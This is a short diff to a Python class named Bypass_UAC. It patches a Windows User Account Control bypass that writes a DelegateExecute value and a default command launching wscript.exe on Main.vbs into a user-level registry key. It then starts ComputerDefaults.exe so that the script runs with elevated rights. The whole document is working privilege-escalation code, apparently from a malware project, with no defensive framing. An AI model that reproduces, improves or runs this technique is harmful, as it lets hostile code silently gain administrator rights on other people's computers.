@@ -1,7 +1,7 @@
 from _winreg import *
 import os
 class Bypass_UAC():
-	def __init__(self):
+	def __init__(self,_):
 		self.__file__ = _.__file__
 		self.Main()
 
@@ -10,7 +10,7 @@ class Bypass_UAC():
 		CreateKey(HKEY_CURRENT_USER, REG_PATH)
 		registry_key = OpenKey(HKEY_CURRENT_USER, REG_PATH, 0, KEY_WRITE)
 		SetValueEx(registry_key, "DelegateExecute", 0, REG_SZ, "")
-		dirname = "\\".join(os.path.abspath(__file__).split("\\")[:-1]) + "\\"
+		dirname = "\\".join(os.path.abspath(self.__file__).split("\\")[:-1]) + "\\"
 		dirname = "wscript.exe \"" + dirname + "Main.vbs\""
 		SetValueEx(registry_key, None, 0, REG_SZ, dirname)
 		os.system("ComputerDefaults.exe")
